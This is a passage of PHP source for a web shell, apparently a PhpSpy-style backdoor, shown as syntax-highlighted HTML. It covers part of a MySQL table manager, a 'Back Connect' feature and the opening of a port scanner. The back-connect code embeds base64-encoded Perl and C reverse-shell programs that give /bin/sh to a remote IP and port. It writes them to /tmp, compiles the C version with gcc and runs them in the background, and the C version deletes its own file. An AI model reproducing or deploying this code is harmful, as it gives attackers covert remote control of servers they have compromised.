<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'&lt;tr class="'</span>.$<span style="color: #f0c674;">thisbg</span>.<span style="color: #8abeb7;">'" onmouseover="this.className=\'foc</span><span style="color: #8abeb7; text-decoration: underline;">us\';" onmouseout="this.className=\''</span><span style="text-decoration: underline;">.$</span><span style="color: #f0c674; text-decoration: underline;">thisbg</span><span style="text-decoration: underline;">.</span><span style="color: #8abeb7; text-decoration: underline;">'\';"&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'&lt;td align="center" width="2%"&gt;&lt;input type="checkbox" name</span><span style="color: #8abeb7; text-decoration: underline;">="table[]" value="'</span><span style="text-decoration: underline;">.$</span><span style="color: #f0c674; text-decoration: underline;">table</span><span style="text-decoration: underline;">[</span><span style="color: #8abeb7; text-decoration: underline;">'Name'</span><span style="text-decoration: underline;">].</span><span style="color: #8abeb7; text-decoration: underline;">'" /&gt;&lt;/td&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'&lt;td&gt;&lt;a href="javascript:settable(\''</span>.$<span style="color: #f0c674;">table</span>[<span style="color: #8abeb7;">'Name'</span>].<span style="color: #8abeb7;">'\');</span><span style="color: #8abeb7; text-decoration: underline;">"&gt;'</span><span style="text-decoration: underline;">.$</span><span style="color: #f0c674; text-decoration: underline;">table</span><span style="text-decoration: underline;">[</span><span style="color: #8abeb7; text-decoration: underline;">'Name'</span><span style="text-decoration: underline;">].</span><span style="color: #8abeb7; text-decoration: underline;">'&lt;/a&gt;&lt;/td&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'&lt;td&gt;'</span>.$<span style="color: #f0c674;">table</span>[<span style="color: #8abeb7;">'Rows'</span>].<span style="color: #8abeb7;">'&lt;/td&gt;'</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'&lt;td&gt;'</span>.$<span style="color: #f0c674;">table</span>[<span style="color: #8abeb7;">'Data_length'</span>].<span style="color: #8abeb7;">'&lt;/td&gt;'</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'&lt;td&gt;'</span>.$<span style="color: #f0c674;">table</span>[<span style="color: #8abeb7;">'Create_time'</span>].<span style="color: #8abeb7;">'&amp;nbsp;&lt;/td&gt;'</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'&lt;td&gt;'</span>.$<span style="color: #f0c674;">table</span>[<span style="color: #8abeb7;">'Update_time'</span>].<span style="color: #8abeb7;">'&amp;nbsp;&lt;/td&gt;'</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> ($<span style="color: #f0c674;">highver</span>) {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'&lt;td&gt;'</span>.$<span style="color: #f0c674;">table</span>[<span style="color: #8abeb7;">'Engine'</span>].<span style="color: #8abeb7;">'&lt;/td&gt;'</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'&lt;td&gt;'</span>.$<span style="color: #f0c674;">table</span>[<span style="color: #8abeb7;">'Collation'</span>].<span style="color: #8abeb7;">'&lt;/td&gt;'</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   }
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'&lt;td&gt;&lt;a href="javascript:settable(\''</span>.$<span style="color: #f0c674;">table</span>[<span style="color: #8abeb7;">'Name'</span>].<span style="color: #8abeb7;">'\', </span><span style="color: #8abeb7; text-decoration: underline;">\'insert\');"&gt;Insert&lt;/a&gt; | &lt;a href="javascript:settable(\''</span><span style="text-decoration: underline;">.$</span><span style="color: #f0c674; text-decoration: underline;">table</span><span style="text-decoration: underline;">[</span><span style="color: #8abeb7; text-decoration: underline;">'Name'</span><span style="text-decoration: underline;">].</span><span style="color: #8abeb7; text-decoration: underline;">'\', \'structure\');"&gt;Structure&lt;/a&gt; | &lt;a href="javascript:settable(\''</span><span style="text-decoration: underline;">.$</span><span style="color: #f0c674; text-decoration: underline;">table</span><span style="text-decoration: underline;">[</span><span style="color: #8abeb7; text-decoration: underline;">'Name'</span><span style="text-decoration: underline;">].</span><span style="color: #8abeb7; text-decoration: underline;">'\', \'drop\');"&gt;Drop&lt;/a&gt;&lt;/td&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'&lt;/tr&gt;'</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   }
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'&lt;tr class="head"&gt;'</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'&lt;td width="2%" align="center"&gt;&lt;input name="chkall" value="on"</span><span style="color: #8abeb7; text-decoration: underline;"> type="checkbox" onclick="CheckAll(this.form)" /&gt;&lt;/td&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'&lt;td&gt;Name&lt;/td&gt;'</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'&lt;td&gt;Rows&lt;/td&gt;'</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'&lt;td&gt;Data_length&lt;/td&gt;'</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'&lt;td&gt;Create_time&lt;/td&gt;'</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'&lt;td&gt;Update_time&lt;/td&gt;'</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> ($<span style="color: #f0c674;">highver</span>) {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'&lt;td&gt;Engine&lt;/td&gt;'</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'&lt;td&gt;Collation&lt;/td&gt;'</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   }
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'&lt;td&gt;Operate&lt;/td&gt;'</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'&lt;/tr&gt;'</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'&lt;tr class='</span>.<span style="color: #c5c8c6; background-color: #1d1f21;">bg(</span>).<span style="color: #8abeb7;">'&gt;'</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'&lt;td&gt;&amp;nbsp;&lt;/td&gt;'</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'&lt;td&gt;Total tables: '</span>.$<span style="color: #f0c674;">table_num</span>.<span style="color: #8abeb7;">'&lt;/td&gt;'</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'&lt;td&gt;'</span>.$<span style="color: #f0c674;">table_rows</span>.<span style="color: #8abeb7;">'&lt;/td&gt;'</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'&lt;td&gt;'</span>.$<span style="color: #f0c674;">data_size</span>.<span style="color: #8abeb7;">'&lt;/td&gt;'</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'&lt;td colspan="'</span>.($<span style="color: #f0c674;">highver</span> ? <span style="color: #c5c8c6; background-color: #1d1f21;">5</span> : <span style="color: #c5c8c6; background-color: #1d1f21;">3</span>).<span style="color: #8abeb7;">'"&gt;&amp;nbsp;&lt;/td&gt;'</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'&lt;/tr&gt;'</span>);

<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">"&lt;tr class=\""</span>.<span style="color: #c5c8c6; background-color: #1d1f21;">bg(</span>).<span style="color: #8abeb7;">"\"&gt;&lt;td colspan=\""</span>.($<span style="color: #f0c674;">highver</span> ? <span style="color: #c5c8c6; background-color: #1d1f21;">9</span> : <span style="color: #c5c8c6; background-color: #1d1f21;">7</span>).<span style="color: #8abeb7;">"\"</span><span style="color: #8abeb7; text-decoration: underline;">&gt;&lt;input name=\"saveasfile\" value=\"1\" type=\"checkbox\" /&gt; Save as file &lt;input class=\"input\" name=\"path\" value=\""</span><span style="text-decoration: underline;">.</span><span style="color: #cc6666; font-weight: bold; text-decoration: underline;">SA_ROOT</span><span style="text-decoration: underline;">.$</span><span style="color: #f0c674; text-decoration: underline;">dbname</span><span style="text-decoration: underline;">.</span><span style="color: #8abeb7; text-decoration: underline;">".sql\" type=\"text\" size=\"60\" /&gt; &lt;input class=\"bt\" type=\"submit\" value=\"Export selection table\" /&gt;&lt;/td&gt;&lt;/tr&gt;"</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">makehide(</span><span style="color: #8abeb7;">'doing'</span>,<span style="color: #8abeb7;">'backupmysql'</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">formfoot(</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">"&lt;/table&gt;"</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">fr(</span>$<span style="color: #f0c674;">query</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   }
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   }
<span style="background-color: #373b41;"> </span>   }
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">tbfoot(</span>);
<span style="background-color: #373b41;"> </span>   @<span style="color: #c5c8c6; background-color: #1d1f21;">mysql_close(</span>);
}<span style="color: #969896; font-style: italic;">//</span><span style="color: #969896; font-style: italic;">end mysql</span>

<span style="color: #b5bd68;">elseif</span> ($<span style="color: #f0c674;">action</span> == <span style="color: #8abeb7;">'backconnect'</span>) {
<span style="background-color: #373b41;"> </span>   !$<span style="color: #f0c674;">yourip</span> &amp;&amp; $<span style="color: #f0c674;">yourip</span> = $<span style="color: #81a2be;">_SERVER</span>[<span style="color: #8abeb7;">'REMOTE_ADDR'</span>];
<span style="background-color: #373b41;"> </span>   !$<span style="color: #f0c674;">yourport</span> &amp;&amp; $<span style="color: #f0c674;">yourport</span> = <span style="color: #8abeb7;">'12345'</span>;
<span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">usedb</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">array(</span><span style="color: #8abeb7;">'perl'</span>=&gt;<span style="color: #8abeb7;">'perl'</span>,<span style="color: #8abeb7;">'c'</span>=&gt;<span style="color: #8abeb7;">'c'</span>);

<span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">back_connect</span>=<span style="color: #8abeb7;">"IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGNtZD0gImx5bngiOw0KJ</span><span style="color: #8abeb7; text-decoration: underline;">HN5c3RlbT0gJ2VjaG8gImB1bmFtZSAtYWAiO2Vj"</span><span style="text-decoration: underline;">.</span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #8abeb7;">"aG8gImBpZGAiOy9iaW4vc2gnOw0KJDA9JGNtZDsNCiR0YXJnZXQ9JEFSR1ZbMF07DQokcG9</span><span style="color: #8abeb7; text-decoration: underline;">ydD0kQVJHVlsxXTsNCiRpYWRkcj1pbmV0X2F0b24oJHR"</span><span style="text-decoration: underline;">.</span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #8abeb7;">"hcmdldCkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRwb3</span><span style="color: #8abeb7; text-decoration: underline;">J0LCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKT"</span><span style="text-decoration: underline;">.</span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #8abeb7;">"sNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JT</span><span style="color: #8abeb7; text-decoration: underline;">kVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoI"</span><span style="text-decoration: underline;">.</span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #8abeb7;">"kVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9y</span><span style="color: #8abeb7; text-decoration: underline;">OiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQi"</span><span style="text-decoration: underline;">.</span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #8abeb7;">"KTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQ</span><span style="color: #8abeb7; text-decoration: underline;">iKTsNCnN5c3RlbSgkc3lzdGVtKTsNCmNsb3NlKFNUREl"</span><span style="text-decoration: underline;">.</span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #8abeb7;">"OKTsNCmNsb3NlKFNURE9VVCk7DQpjbG9zZShTVERFUlIpOw=="</span>;
<span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">back_connect_c</span>=<span style="color: #8abeb7;">"I2luY2x1ZGUgPHN0ZGlvLmg+DQojaW5jbHVkZSA8c3lzL3NvY2tldC5oPg0</span><span style="color: #8abeb7; text-decoration: underline;">KI2luY2x1ZGUgPG5ldGluZXQvaW4uaD4NCmludC"</span><span style="text-decoration: underline;">.</span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #8abeb7;">"BtYWluKGludCBhcmdjLCBjaGFyICphcmd2W10pDQp7DQogaW50IGZkOw0KIHN0cnVjdCBzb</span><span style="color: #8abeb7; text-decoration: underline;">2NrYWRkcl9pbiBzaW47DQogY2hhciBybXNbMjFdPSJyb"</span><span style="text-decoration: underline;">.</span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #8abeb7;">"SAtZiAiOyANCiBkYWVtb24oMSwwKTsNCiBzaW4uc2luX2ZhbWlseSA9IEFGX0lORVQ7DQog</span><span style="color: #8abeb7; text-decoration: underline;">c2luLnNpbl9wb3J0ID0gaHRvbnMoYXRvaShhcmd2WzJd"</span><span style="text-decoration: underline;">.</span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #8abeb7;">"KSk7DQogc2luLnNpbl9hZGRyLnNfYWRkciA9IGluZXRfYWRkcihhcmd2WzFdKTsgDQogYnp</span><span style="color: #8abeb7; text-decoration: underline;">lcm8oYXJndlsxXSxzdHJsZW4oYXJndlsxXSkrMStzdHJ"</span><span style="text-decoration: underline;">.</span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #8abeb7;">"sZW4oYXJndlsyXSkpOyANCiBmZCA9IHNvY2tldChBRl9JTkVULCBTT0NLX1NUUkVBTSwgSV</span><span style="color: #8abeb7; text-decoration: underline;">BQUk9UT19UQ1ApIDsgDQogaWYgKChjb25uZWN0KGZkLC"</span><span style="text-decoration: underline;">.</span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #8abeb7;">"Aoc3RydWN0IHNvY2thZGRyICopICZzaW4sIHNpemVvZihzdHJ1Y3Qgc29ja2FkZHIpKSk8M</span><span style="color: #8abeb7; text-decoration: underline;">Ckgew0KICAgcGVycm9yKCJbLV0gY29ubmVjdCgpIik7D"</span><span style="text-decoration: underline;">.</span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #8abeb7;">"QogICBleGl0KDApOw0KIH0NCiBzdHJjYXQocm1zLCBhcmd2WzBdKTsNCiBzeXN0ZW0ocm1z</span><span style="color: #8abeb7; text-decoration: underline;">KTsgIA0KIGR1cDIoZmQsIDApOw0KIGR1cDIoZmQsIDEp"</span><span style="text-decoration: underline;">.</span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #8abeb7;">"Ow0KIGR1cDIoZmQsIDIpOw0KIGV4ZWNsKCIvYmluL3NoIiwic2ggLWkiLCBOVUxMKTsNCiB</span><span style="color: #8abeb7; text-decoration: underline;">jbG9zZShmZCk7IA0KfQ=="</span><span style="text-decoration: underline;">;</span>

<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> ($<span style="color: #f0c674;">start</span> &amp;&amp; $<span style="color: #f0c674;">yourip</span> &amp;&amp; $<span style="color: #f0c674;">yourport</span> &amp;&amp; $<span style="color: #f0c674;">use</span>){
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> ($<span style="color: #f0c674;">use</span> == <span style="color: #8abeb7;">'perl'</span>) {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">cf(</span><span style="color: #8abeb7;">'/tmp/angel_bc'</span>,$<span style="color: #f0c674;">back_connect</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">res</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">execute(which(</span><span style="color: #8abeb7;">'perl'</span>).<span style="color: #8abeb7;">" /tmp/angel_bc $yourip $yourport &amp;"</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   } <span style="color: #b5bd68;">else</span> {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">cf(</span><span style="color: #8abeb7;">'/tmp/angel_bc.c'</span>,$<span style="color: #f0c674;">back_connect_c</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">res</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">execute(</span><span style="color: #8abeb7;">'gcc -o /tmp/angel_bc /tmp/angel_bc.c'</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   @<span style="color: #c5c8c6; background-color: #1d1f21;">unlink(</span><span style="color: #8abeb7;">'/tmp/angel_bc.c'</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">res</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">execute(</span><span style="color: #8abeb7;">"/tmp/angel_bc $yourip $yourport &amp;"</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   }
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">m(</span><span style="color: #8abeb7;">"Now script try connect to $yourip port $yourport ..."</span>);
<span style="background-color: #373b41;"> </span>   }

<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">formhead(array(</span><span style="color: #8abeb7;">'title'</span>=&gt;<span style="color: #8abeb7;">'Back Connect'</span>));
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">makehide(</span><span style="color: #8abeb7;">'action'</span>,<span style="color: #8abeb7;">'backconnect'</span>);
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'&lt;p&gt;'</span>);
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'Your IP:'</span>);
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">makeinput(array(</span><span style="color: #8abeb7;">'name'</span>=&gt;<span style="color: #8abeb7;">'yourip'</span>,<span style="color: #8abeb7;">'size'</span>=&gt;<span style="color: #c5c8c6; background-color: #1d1f21;">20</span>,<span style="color: #8abeb7;">'value'</span>=&gt;$<span style="color: #f0c674;">yourip</span>));
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'Your Port:'</span>);
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">makeinput(array(</span><span style="color: #8abeb7;">'name'</span>=&gt;<span style="color: #8abeb7;">'yourport'</span>,<span style="color: #8abeb7;">'size'</span>=&gt;<span style="color: #c5c8c6; background-color: #1d1f21;">15</span>,<span style="color: #8abeb7;">'value'</span>=&gt;$<span style="color: #f0c674;">yourport</span>));
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'Use:'</span>);
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">makeselect(array(</span><span style="color: #8abeb7;">'name'</span>=&gt;<span style="color: #8abeb7;">'use'</span>,<span style="color: #8abeb7;">'option'</span>=&gt;$<span style="color: #f0c674;">usedb</span>,<span style="color: #8abeb7;">'selected'</span>=&gt;$<span style="color: #f0c674;">use</span>));
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">makeinput(array(</span><span style="color: #8abeb7;">'name'</span>=&gt;<span style="color: #8abeb7;">'start'</span>,<span style="color: #8abeb7;">'value'</span>=&gt;<span style="color: #8abeb7;">'Start'</span>,<span style="color: #8abeb7;">'type'</span>=&gt;<span style="color: #8abeb7;">'submit'</span>,<span style="color: #8abeb7;">'class'</span>=&gt;<span style="color: #8abeb7;">'</span><span style="color: #8abeb7; text-decoration: underline;">bt'</span><span style="text-decoration: underline;">));</span>
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'&lt;/p&gt;'</span>);
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">formfoot(</span>);
}<span style="color: #969896; font-style: italic;">//</span><span style="color: #969896; font-style: italic;">end</span>

<span style="color: #b5bd68;">elseif</span> ($<span style="color: #f0c674;">action</span> == <span style="color: #8abeb7;">'portscan'</span>) {
<span style="background-color: #373b41;"> </span>   !$<span style="color: #f0c674;">scanip</span> &amp;&amp; $<span style="color: #f0c674;">scanip</span> = <span style="color: #8abeb7;">'127.0.0.1'</span>;
